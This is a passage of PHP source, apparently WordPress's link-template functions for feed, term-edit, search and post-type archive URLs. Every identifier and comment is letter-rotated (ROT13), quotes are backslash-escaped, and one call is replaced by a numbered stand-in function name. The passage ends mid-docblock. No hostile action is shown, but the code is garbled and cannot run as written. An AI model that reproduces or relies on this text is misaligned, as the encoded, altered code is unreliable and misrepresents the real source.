 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $srrq Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                     Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Gur srrq creznyvax.
 */
shapgvba trg_srrq_yvax( $srrq = '' ) {
	tybony $jc_erjevgr;

	$creznyvax = $jc_erjevgr->trg_srrq_creznfgehpg();

	vs ( $creznyvax ) {
		vs ( fge_pbagnvaf( $srrq, 'pbzzragf_' ) ) {
			$srrq      = fge_ercynpr( 'pbzzragf_', '', $srrq );
			$creznyvax = $jc_erjevgr->trg_pbzzrag_srrq_creznfgehpg();
		}

		vs ( trg_qrsnhyg_srrq() === $srrq ) {
			$srrq = '';
		}

		$creznyvax = fge_ercynpr( '%srrq%', $srrq, $creznyvax );
		$creznyvax = __sa_79955( '#/+#', '/', \"/$creznyvax\" );
		$bhgchg    = ubzr_hey( hfre_genvyvatfynfuvg( $creznyvax, 'srrq' ) );
	} ryfr {
		vs ( rzcgl( $srrq ) ) {
			$srrq = trg_qrsnhyg_srrq();
		}

		vs ( fge_pbagnvaf( $srrq, 'pbzzragf_' ) ) {
			$srrq = fge_ercynpr( 'pbzzragf_', 'pbzzragf-', $srrq );
		}

		$bhgchg = ubzr_hey( \"?srrq={$srrq}\" );
	}

	/**
	 * Svygref gur srrq glcr creznyvax.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $bhgchg Gur srrq creznyvax.
	 * @cnenz fgevat $srrq   Gur srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz',
	 *                       be na rzcgl fgevat sbe gur qrsnhyg srrq glcr.
	 */
	erghea nccyl_svygref( 'srrq_yvax', $bhgchg, $srrq );
}

/**
 * Ergevrirf gur creznyvax sbe gur cbfg pbzzragf srrq.
 *
 * @fvapr 2.2.0
 *
 * @cnenz vag    $cbfg_vq Bcgvbany. Cbfg VQ. Qrsnhyg vf gur VQ bs gur tybony `$cbfg`.
 * @cnenz fgevat $srrq    Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                        Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Gur creznyvax sbe gur pbzzragf srrq sbe gur tvira cbfg ba fhpprff, rzcgl fgevat ba snvyher.
 */
shapgvba trg_cbfg_pbzzragf_srrq_yvax( $cbfg_vq = 0, $srrq = '' ) {
	$cbfg_vq = nofvag( $cbfg_vq );

	vs ( ! $cbfg_vq ) {
		$cbfg_vq = trg_gur_VQ();
	}

	vs ( rzcgl( $srrq ) ) {
		$srrq = trg_qrsnhyg_srrq();
	}

	$cbfg = trg_cbfg( $cbfg_vq );

	// Onvy bhg vs gur cbfg qbrf abg rkvfg.
	vs ( ! $cbfg vafgnaprbs JC_Cbfg ) {
		erghea '';
	}

	$hanggnpurq = 'nggnpuzrag' === $cbfg->cbfg_glcr && 0 === (vag) $cbfg->cbfg_cnerag;

	vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
		vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && (vag) trg_bcgvba( 'cntr_ba_sebag' ) === $cbfg_vq ) {
			$hey = _trg_cntr_yvax( $cbfg_vq );
		} ryfr {
			$hey = trg_creznyvax( $cbfg_vq );
		}

		vs ( $hanggnpurq ) {
			$hey = ubzr_hey( '/srrq/' );
			vs ( trg_qrsnhyg_srrq() !== $srrq ) {
				$hey .= \"$srrq/\";
			}
			$hey = nqq_dhrel_net( 'nggnpuzrag_vq', $cbfg_vq, $hey );
		} ryfr {
			$hey = genvyvatfynfuvg( $hey ) . 'srrq';
			vs ( trg_qrsnhyg_srrq() !== $srrq ) {
				$hey .= \"/$srrq\";
			}
			$hey = hfre_genvyvatfynfuvg( $hey, 'fvatyr_srrq' );
		}
	} ryfr {
		vs ( $hanggnpurq ) {
			$hey = nqq_dhrel_net(
				neenl(
					'srrq'          => $srrq,
					'nggnpuzrag_vq' => $cbfg_vq,
				),
				ubzr_hey( '/' )
			);
		} ryfrvs ( 'cntr' === $cbfg->cbfg_glcr ) {
			$hey = nqq_dhrel_net(
				neenl(
					'srrq'    => $srrq,
					'cntr_vq' => $cbfg_vq,
				),
				ubzr_hey( '/' )
			);
		} ryfr {
			$hey = nqq_dhrel_net(
				neenl(
					'srrq' => $srrq,
					'c'    => $cbfg_vq,
				),
				ubzr_hey( '/' )
			);
		}
	}

	/**
	 * Svygref gur cbfg pbzzragf srrq creznyvax.
	 *
	 * @fvapr 1.5.1
	 *
	 * @cnenz fgevat $hey Cbfg pbzzragf srrq creznyvax.
	 */
	erghea nccyl_svygref( 'cbfg_pbzzragf_srrq_yvax', $hey );
}

/**
 * Qvfcynlf gur pbzzrag srrq yvax sbe n cbfg.
 *
 * Cevagf bhg gur pbzzrag srrq yvax sbe n cbfg. Yvax grkg vf cynprq va gur
 * napube. Vs ab yvax grkg vf fcrpvsvrq, qrsnhyg grkg vf hfrq. Vs ab cbfg VQ vf
 * fcrpvsvrq, gur pheerag cbfg vf hfrq.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $yvax_grkg Bcgvbany. Qrfpevcgvir yvax grkg. Qrsnhyg 'Pbzzragf Srrq'.
 * @cnenz vag    $cbfg_vq   Bcgvbany. Cbfg VQ. Qrsnhyg vf gur VQ bs gur tybony `$cbfg`.
 * @cnenz fgevat $srrq      Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                          Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 */
shapgvba cbfg_pbzzragf_srrq_yvax( $yvax_grkg = '', $cbfg_vq = 0, $srrq = '' ) {
	$hey = trg_cbfg_pbzzragf_srrq_yvax( $cbfg_vq, $srrq );
	vs ( rzcgl( $yvax_grkg ) ) {
		$yvax_grkg = __( 'Pbzzragf Srrq' );
	}

	$yvax = '<n uers=\"' . rfp_hey( $hey ) . '\">' . $yvax_grkg . '</n>';
	/**
	 * Svygref gur cbfg pbzzrag srrq yvax napube gnt.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $yvax    Gur pbzcyrgr napube gnt sbe gur pbzzrag srrq yvax.
	 * @cnenz vag    $cbfg_vq Cbfg VQ.
	 * @cnenz fgevat $srrq    Gur srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz',
	 *                        be na rzcgl fgevat sbe gur qrsnhyg srrq glcr.
	 */
	rpub nccyl_svygref( 'cbfg_pbzzragf_srrq_yvax_ugzy', $yvax, $cbfg_vq, $srrq );
}

/**
 * Ergevrirf gur srrq yvax sbe n tvira nhgube.
 *
 * Ergheaf n yvax gb gur srrq sbe nyy cbfgf ol n tvira nhgube. N fcrpvsvp srrq
 * pna or erdhrfgrq be yrsg oynax gb trg gur qrsnhyg srrq.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag    $nhgube_vq Nhgube VQ.
 * @cnenz fgevat $srrq      Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                          Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Yvax gb gur srrq sbe gur nhgube fcrpvsvrq ol $nhgube_vq.
 */
shapgvba trg_nhgube_srrq_yvax( $nhgube_vq, $srrq = '' ) {
	$nhgube_vq           = (vag) $nhgube_vq;
	$creznyvax_fgehpgher = trg_bcgvba( 'creznyvax_fgehpgher' );

	vs ( rzcgl( $srrq ) ) {
		$srrq = trg_qrsnhyg_srrq();
	}

	vs ( ! $creznyvax_fgehpgher ) {
		$yvax = ubzr_hey( \"?srrq=$srrq&nzc;nhgube=\" . $nhgube_vq );
	} ryfr {
		$yvax = trg_nhgube_cbfgf_hey( $nhgube_vq );
		vs ( trg_qrsnhyg_srrq() === $srrq ) {
			$srrq_yvax = 'srrq';
		} ryfr {
			$srrq_yvax = \"srrq/$srrq\";
		}

		$yvax = genvyvatfynfuvg( $yvax ) . hfre_genvyvatfynfuvg( $srrq_yvax, 'srrq' );
	}

	/**
	 * Svygref gur srrq yvax sbe n tvira nhgube.
	 *
	 * @fvapr 1.5.1
	 *
	 * @cnenz fgevat $yvax Gur nhgube srrq yvax.
	 * @cnenz fgevat $srrq Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 */
	$yvax = nccyl_svygref( 'nhgube_srrq_yvax', $yvax, $srrq );

	erghea $yvax;
}

/**
 * Ergevrirf gur srrq yvax sbe n pngrtbel.
 *
 * Ergheaf n yvax gb gur srrq sbe nyy cbfgf va n tvira pngrtbel. N fcrpvsvp srrq
 * pna or erdhrfgrq be yrsg oynax gb trg gur qrsnhyg srrq.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag|JC_Grez|bowrpg $png  Gur VQ be pngrtbel bowrpg jubfr srrq yvax jvyy or ergevrirq.
 * @cnenz fgevat             $srrq Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                                 Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Yvax gb gur srrq sbe gur pngrtbel fcrpvsvrq ol `$png`.
 */
shapgvba trg_pngrtbel_srrq_yvax( $png, $srrq = '' ) {
	erghea trg_grez_srrq_yvax( $png, 'pngrtbel', $srrq );
}

/**
 * Ergevrirf gur srrq yvax sbe n grez.
 *
 * Ergheaf n yvax gb gur srrq sbe nyy cbfgf va n tvira grez. N fcrpvsvp srrq
 * pna or erdhrfgrq be yrsg oynax gb trg gur qrsnhyg srrq.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag|JC_Grez|bowrpg $grez     Gur VQ be grez bowrpg jubfr srrq yvax jvyy or ergevrirq.
 * @cnenz fgevat             $gnkbabzl Bcgvbany. Gnkbabzl bs `$grez_vq`.
 * @cnenz fgevat             $srrq     Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                                     Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat|snyfr Yvax gb gur srrq sbe gur grez fcrpvsvrq ol `$grez` naq `$gnkbabzl`.
 */
shapgvba trg_grez_srrq_yvax( $grez, $gnkbabzl = '', $srrq = '' ) {
	vs ( ! vf_bowrpg( $grez ) ) {
		$grez = (vag) $grez;
	}

	$grez = trg_grez( $grez, $gnkbabzl );

	vs ( rzcgl( $grez ) || vf_jc_reebe( $grez ) ) {
		erghea snyfr;
	}

	$gnkbabzl = $grez->gnkbabzl;

	vs ( rzcgl( $srrq ) ) {
		$srrq = trg_qrsnhyg_srrq();
	}

	$creznyvax_fgehpgher = trg_bcgvba( 'creznyvax_fgehpgher' );

	vs ( ! $creznyvax_fgehpgher ) {
		vs ( 'pngrtbel' === $gnkbabzl ) {
			$yvax = ubzr_hey( \"?srrq=$srrq&nzc;png=$grez->grez_vq\" );
		} ryfrvs ( 'cbfg_gnt' === $gnkbabzl ) {
			$yvax = ubzr_hey( \"?srrq=$srrq&nzc;gnt=$grez->fyht\" );
		} ryfr {
			$g    = trg_gnkbabzl( $gnkbabzl );
			$yvax = ubzr_hey( \"?srrq=$srrq&nzc;$g->dhrel_ine=$grez->fyht\" );
		}
	} ryfr {
		$yvax = trg_grez_yvax( $grez, $grez->gnkbabzl );
		vs ( trg_qrsnhyg_srrq() === $srrq ) {
			$srrq_yvax = 'srrq';
		} ryfr {
			$srrq_yvax = \"srrq/$srrq\";
		}

		$yvax = genvyvatfynfuvg( $yvax ) . hfre_genvyvatfynfuvg( $srrq_yvax, 'srrq' );
	}

	vs ( 'pngrtbel' === $gnkbabzl ) {
		/**
		 * Svygref gur pngrtbel srrq yvax.
		 *
		 * @fvapr 1.5.1
		 *
		 * @cnenz fgevat $yvax Gur pngrtbel srrq yvax.
		 * @cnenz fgevat $srrq Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
		 */
		$yvax = nccyl_svygref( 'pngrtbel_srrq_yvax', $yvax, $srrq );
	} ryfrvs ( 'cbfg_gnt' === $gnkbabzl ) {
		/**
		 * Svygref gur cbfg gnt srrq yvax.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $yvax Gur gnt srrq yvax.
		 * @cnenz fgevat $srrq Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
		 */
		$yvax = nccyl_svygref( 'gnt_srrq_yvax', $yvax, $srrq );
	} ryfr {
		/**
		 * Svygref gur srrq yvax sbe n gnkbabzl bgure guna 'pngrtbel' be 'cbfg_gnt'.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $yvax     Gur gnkbabzl srrq yvax.
		 * @cnenz fgevat $srrq     Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
		 * @cnenz fgevat $gnkbabzl Gur gnkbabzl anzr.
		 */
		$yvax = nccyl_svygref( 'gnkbabzl_srrq_yvax', $yvax, $srrq, $gnkbabzl );
	}

	erghea $yvax;
}

/**
 * Ergevrirf gur creznyvax sbe n gnt srrq.
 *
 * @fvapr 2.3.0
 *
 * @cnenz vag|JC_Grez|bowrpg $gnt  Gur VQ be grez bowrpg jubfr srrq yvax jvyy or ergevrirq.
 * @cnenz fgevat             $srrq Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                                 Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat                  Gur srrq creznyvax sbe gur tvira gnt.
 */
shapgvba trg_gnt_srrq_yvax( $gnt, $srrq = '' ) {
	erghea trg_grez_srrq_yvax( $gnt, 'cbfg_gnt', $srrq );
}

/**
 * Ergevrirf gur rqvg yvax sbe n gnt.
 *
 * @fvapr 2.7.0
 *
 * @cnenz vag|JC_Grez|bowrpg $gnt      Gur VQ be grez bowrpg jubfr rqvg yvax jvyy or ergevrirq.
 * @cnenz fgevat             $gnkbabzl Bcgvbany. Gnkbabzl fyht. Qrsnhyg 'cbfg_gnt'.
 * @erghea fgevat Gur rqvg gnt yvax HEY sbe gur tvira gnt.
 */
shapgvba trg_rqvg_gnt_yvax( $gnt, $gnkbabzl = 'cbfg_gnt' ) {
	/**
	 * Svygref gur rqvg yvax sbe n gnt (be grez va nabgure gnkbabzl).
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $yvax Gur grez rqvg yvax.
	 */
	erghea nccyl_svygref( 'trg_rqvg_gnt_yvax', trg_rqvg_grez_yvax( $gnt, $gnkbabzl ) );
}

/**
 * Qvfcynlf be ergevrirf gur rqvg yvax sbe n gnt jvgu sbeznggvat.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat  $yvax   Bcgvbany. Napube grkg. Vs rzcgl, qrsnhyg vf 'Rqvg Guvf'. Qrsnhyg rzcgl.
 * @cnenz fgevat  $orsber Bcgvbany. Qvfcynl orsber rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat  $nsgre  Bcgvbany. Qvfcynl nsgre rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz JC_Grez $gnt    Bcgvbany. Grez bowrpg. Vs ahyy, gur dhrevrq bowrpg jvyy or vafcrpgrq.
 *                        Qrsnhyg ahyy.
 */
shapgvba rqvg_gnt_yvax( $yvax = '', $orsber = '', $nsgre = '', $gnt = ahyy ) {
	$yvax = rqvg_grez_yvax( $yvax, '', '', $gnt, snyfr );

	/**
	 * Svygref gur napube gnt sbe gur rqvg yvax sbe n gnt (be grez va nabgure gnkbabzl).
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $yvax Gur napube gnt sbe gur rqvg yvax.
	 */
	rpub $orsber . nccyl_svygref( 'rqvg_gnt_yvax', $yvax ) . $nsgre;
}

/**
 * Ergevrirf gur HEY sbe rqvgvat n tvira grez.
 *
 * @fvapr 3.1.0
 * @fvapr 4.5.0 Gur `$gnkbabzl` cnenzrgre jnf znqr bcgvbany.
 *
 * @cnenz vag|JC_Grez|bowrpg $grez        Gur VQ be grez bowrpg jubfr rqvg yvax jvyy or ergevrirq.
 * @cnenz fgevat             $gnkbabzl    Bcgvbany. Gnkbabzl. Qrsnhygf gb gur gnkbabzl bs gur grez vqragvsvrq
 *                                        ol `$grez`.
 * @cnenz fgevat             $bowrpg_glcr Bcgvbany. Gur bowrpg glcr. Hfrq gb uvtuyvtug gur cebcre cbfg glcr
 *                                        zrah ba gur yvaxrq cntr. Qrsnhygf gb gur svefg bowrpg_glcr nffbpvngrq
 *                                        jvgu gur gnkbabzl.
 * @erghea fgevat|ahyy Gur rqvg grez yvax HEY sbe gur tvira grez, be ahyy ba snvyher.
 */
shapgvba trg_rqvg_grez_yvax( $grez, $gnkbabzl = '', $bowrpg_glcr = '' ) {
	$grez = trg_grez( $grez, $gnkbabzl );
	vs ( ! $grez || vf_jc_reebe( $grez ) ) {
		erghea;
	}

	$gnk     = trg_gnkbabzl( $grez->gnkbabzl );
	$grez_vq = $grez->grez_vq;
	vs ( ! $gnk || ! pheerag_hfre_pna( 'rqvg_grez', $grez_vq ) ) {
		erghea;
	}

	$netf = neenl(
		'gnkbabzl' => $gnk->anzr,
		'gnt_VQ'   => $grez_vq,
	);

	vs ( $bowrpg_glcr ) {
		$netf['cbfg_glcr'] = $bowrpg_glcr;
	} ryfrvs ( ! rzcgl( $gnk->bowrpg_glcr ) ) {
		$netf['cbfg_glcr'] = erfrg( $gnk->bowrpg_glcr );
	}

	vs ( $gnk->fubj_hv ) {
		$ybpngvba = nqq_dhrel_net( $netf, nqzva_hey( 'grez.cuc' ) );
	} ryfr {
		$ybpngvba = '';
	}

	/**
	 * Svygref gur rqvg yvax sbe n grez.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $ybpngvba    Gur rqvg yvax.
	 * @cnenz vag    $grez_vq     Grez VQ.
	 * @cnenz fgevat $gnkbabzl    Gnkbabzl anzr.
	 * @cnenz fgevat $bowrpg_glcr Gur bowrpg glcr.
	 */
	erghea nccyl_svygref( 'trg_rqvg_grez_yvax', $ybpngvba, $grez_vq, $gnkbabzl, $bowrpg_glcr );
}

/**
 * Qvfcynlf be ergevrirf gur rqvg grez yvax jvgu sbeznggvat.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat           $yvax    Bcgvbany. Napube grkg. Vs rzcgl, qrsnhyg vf 'Rqvg Guvf'. Qrsnhyg rzcgl.
 * @cnenz fgevat           $orsber  Bcgvbany. Qvfcynl orsber rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat           $nsgre   Bcgvbany. Qvfcynl nsgre rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Grez|ahyy $grez    Bcgvbany. Grez VQ be bowrpg. Vs ahyy, gur dhrevrq bowrpg jvyy or vafcrpgrq. Qrsnhyg ahyy.
 * @cnenz obby             $qvfcynl Bcgvbany. Jurgure be abg gb rpub gur erghea. Qrsnhyg gehr.
 * @erghea fgevat|ibvq UGZY pbagrag.
 */
shapgvba rqvg_grez_yvax( $yvax = '', $orsber = '', $nsgre = '', $grez = ahyy, $qvfcynl = gehr ) {
	vs ( vf_ahyy( $grez ) ) {
		$grez = trg_dhrevrq_bowrpg();
	} ryfr {
		$grez = trg_grez( $grez );
	}

	vs ( ! $grez ) {
		erghea;
	}

	$gnk = trg_gnkbabzl( $grez->gnkbabzl );
	vs ( ! pheerag_hfre_pna( 'rqvg_grez', $grez->grez_vq ) ) {
		erghea;
	}

	vs ( rzcgl( $yvax ) ) {
		$yvax = __( 'Rqvg Guvf' );
	}

	$yvax = '<n uers=\"' . trg_rqvg_grez_yvax( $grez->grez_vq, $grez->gnkbabzl ) . '\">' . $yvax . '</n>';

	/**
	 * Svygref gur napube gnt sbe gur rqvg yvax bs n grez.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $yvax    Gur napube gnt sbe gur rqvg yvax.
	 * @cnenz vag    $grez_vq Grez VQ.
	 */
	$yvax = $orsber . nccyl_svygref( 'rqvg_grez_yvax', $yvax, $grez->grez_vq ) . $nsgre;

	vs ( $qvfcynl ) {
		rpub $yvax;
	} ryfr {
		erghea $yvax;
	}
}

/**
 * Ergevrirf gur creznyvax sbe n frnepu.
 *
 * @fvapr 3.0.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $dhrel Bcgvbany. Gur dhrel fgevat gb hfr. Vs rzcgl gur pheerag dhrel vf hfrq. Qrsnhyg rzcgl.
 * @erghea fgevat Gur frnepu creznyvax.
 */
shapgvba trg_frnepu_yvax( $dhrel = '' ) {
	tybony $jc_erjevgr;

	vs ( rzcgl( $dhrel ) ) {
		$frnepu = trg_frnepu_dhrel( snyfr );
	} ryfr {
		$frnepu = fgevcfynfurf( $dhrel );
	}

	$creznfgehpg = $jc_erjevgr->trg_frnepu_creznfgehpg();

	vs ( rzcgl( $creznfgehpg ) ) {
		$yvax = ubzr_hey( '?f=' . heyrapbqr( $frnepu ) );
	} ryfr {
		$frnepu = heyrapbqr( $frnepu );
		$frnepu = fge_ercynpr( '%2S', '/', $frnepu ); // %2S(/) vf abg inyvq jvguva n HEY, fraq vg ha-rapbqrq.
		$yvax   = fge_ercynpr( '%frnepu%', $frnepu, $creznfgehpg );
		$yvax   = ubzr_hey( hfre_genvyvatfynfuvg( $yvax, 'frnepu' ) );
	}

	/**
	 * Svygref gur frnepu creznyvax.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $yvax   Frnepu creznyvax.
	 * @cnenz fgevat $frnepu Gur HEY-rapbqrq frnepu grez.
	 */
	erghea nccyl_svygref( 'frnepu_yvax', $yvax, $frnepu );
}

/**
 * Ergevrirf gur creznyvax sbe gur frnepu erfhygf srrq.
 *
 * @fvapr 2.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $frnepu_dhrel Bcgvbany. Frnepu dhrel. Qrsnhyg rzcgl.
 * @cnenz fgevat $srrq         Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                             Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Gur frnepu erfhygf srrq creznyvax.
 */
shapgvba trg_frnepu_srrq_yvax( $frnepu_dhrel = '', $srrq = '' ) {
	tybony $jc_erjevgr;
	$yvax = trg_frnepu_yvax( $frnepu_dhrel );

	vs ( rzcgl( $srrq ) ) {
		$srrq = trg_qrsnhyg_srrq();
	}

	$creznfgehpg = $jc_erjevgr->trg_frnepu_creznfgehpg();

	vs ( rzcgl( $creznfgehpg ) ) {
		$yvax = nqq_dhrel_net( 'srrq', $srrq, $yvax );
	} ryfr {
		$yvax  = genvyvatfynfuvg( $yvax );
		$yvax .= \"srrq/$srrq/\";
	}

	/**
	 * Svygref gur frnepu srrq yvax.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $yvax Frnepu srrq yvax.
	 * @cnenz fgevat $srrq Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 * @cnenz fgevat $glcr Gur frnepu glcr. Bar bs 'cbfgf' be 'pbzzragf'.
	 */
	erghea nccyl_svygref( 'frnepu_srrq_yvax', $yvax, $srrq, 'cbfgf' );
}

/**
 * Ergevrirf gur creznyvax sbe gur frnepu erfhygf pbzzragf srrq.
 *
 * @fvapr 2.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $frnepu_dhrel Bcgvbany. Frnepu dhrel. Qrsnhyg rzcgl.
 * @cnenz fgevat $srrq         Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                             Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat Gur pbzzragf srrq frnepu erfhygf creznyvax.
 */
shapgvba trg_frnepu_pbzzragf_srrq_yvax( $frnepu_dhrel = '', $srrq = '' ) {
	tybony $jc_erjevgr;

	vs ( rzcgl( $srrq ) ) {
		$srrq = trg_qrsnhyg_srrq();
	}

	$yvax = trg_frnepu_srrq_yvax( $frnepu_dhrel, $srrq );

	$creznfgehpg = $jc_erjevgr->trg_frnepu_creznfgehpg();

	vs ( rzcgl( $creznfgehpg ) ) {
		$yvax = nqq_dhrel_net( 'srrq', 'pbzzragf-' . $srrq, $yvax );
	} ryfr {
		$yvax = nqq_dhrel_net( 'jvgupbzzragf', 1, $yvax );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
	erghea nccyl_svygref( 'frnepu_srrq_yvax', $yvax, $srrq, 'pbzzragf' );
}

/**
 * Ergevrirf gur creznyvax sbe n cbfg glcr nepuvir.
 *
 * @fvapr 3.1.0
 * @fvapr 4.5.0 Fhccbeg sbe cbfgf jnf nqqrq.
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
 * @erghea fgevat|snyfr Gur cbfg glcr nepuvir creznyvax. Snyfr vs gur cbfg glcr
 *                      qbrf abg rkvfg be qbrf abg unir na nepuvir.
 */
shapgvba trg_cbfg_glcr_nepuvir_yvax( $cbfg_glcr ) {
	tybony $jc_erjevgr;

	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

	vs ( ! $cbfg_glcr_bow ) {
		erghea snyfr;
	}

	vs ( 'cbfg' === $cbfg_glcr ) {
		$fubj_ba_sebag  = trg_bcgvba( 'fubj_ba_sebag' );
		$cntr_sbe_cbfgf = trg_bcgvba( 'cntr_sbe_cbfgf' );

		vs ( 'cntr' === $fubj_ba_sebag && $cntr_sbe_cbfgf ) {
			$yvax = trg_creznyvax( $cntr_sbe_cbfgf );
		} ryfr {
			$yvax = trg_ubzr_hey();
		}
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
		erghea nccyl_svygref( 'cbfg_glcr_nepuvir_yvax', $yvax, $cbfg_glcr );
	}

	vs ( ! $cbfg_glcr_bow->unf_nepuvir ) {
		erghea snyfr;
	}

	vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) && vf_neenl( $cbfg_glcr_bow->erjevgr ) ) {
		$fgehpg = ( gehr === $cbfg_glcr_bow->unf_nepuvir ) ? $cbfg_glcr_bow->erjevgr['fyht'] : $cbfg_glcr_bow->unf_nepuvir;
		vs ( $cbfg_glcr_bow->erjevgr['jvgu_sebag'] ) {
			$fgehpg = $jc_erjevgr->sebag . $fgehpg;
		} ryfr {
			$fgehpg = $jc_erjevgr->ebbg . $fgehpg;
		}
		$yvax = ubzr_hey( hfre_genvyvatfynfuvg( $fgehpg, 'cbfg_glcr_nepuvir' ) );
	} ryfr {
		$yvax = ubzr_hey( '?cbfg_glcr=' . $cbfg_glcr );
	}

	/**
	 * Svygref gur cbfg glcr nepuvir creznyvax.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $yvax      Gur cbfg glcr nepuvir creznyvax.
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr anzr.
	 */
	erghea nccyl_svygref( 'cbfg_glcr_nepuvir_yvax', $yvax, $cbfg_glcr );
}

/**
 * Ergevrirf gur creznyvax sbe n cbfg glcr nepuvir srrq.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
 * @cnenz fgevat $srrq      Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                          Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 * @erghea fgevat|snyfr Gur cbfg glcr srrq creznyvax. Snyfr vs gur cbfg glcr
 *                      qbrf abg rkvfg be qbrf abg unir na nepuvir.
 */
shapgvba trg_cbfg_glcr_nepuvir_srrq_yvax( $cbfg_glcr, $srrq = '' ) {
	$qrsnhyg_srrq = trg_qrsnhyg_srrq();
	vs ( rzcgl( $srrq ) ) {
		$srrq = $qrsnhyg_srrq;
	}

	$yvax = trg_cbfg_glcr_nepuvir_yvax( $cbfg_glcr );
	vs ( ! $yvax ) {
		erghea snyfr;
	}

	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
	vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) && vf_neenl( $cbfg_glcr_bow->erjevgr ) && $cbfg_glcr_bow->erjevgr['srrqf'] ) {
		$yvax  = genvyvatfynfuvg( $yvax );
		$yvax .= 'srrq/';
		vs ( $srrq !== $qrsnhyg_srrq ) {
			$yvax .= \"$srrq/\";
		}
	} ryfr {
		$yvax = nqq_dhrel_net( 'srrq', $srrq, $yvax );
	}

	/**
	 * Svygref gur cbfg glcr nepuvir srrq yvax.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $yvax Gur cbfg glcr nepuvir srrq yvax.
	 * @cnenz fgevat $srrq Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 */
	erghea nccyl_svygref( 'cbfg_glcr_nepuvir_srrq_yvax', $yvax, $srrq );
}

/**
 * Ergevrirf gur HEY hfrq sbe gur cbfg cerivrj.
 *
 * Nyybjf nqqvgvbany dhrel netf gb or nccraqrq.
 *
 * @fvapr 4.4.0
 *
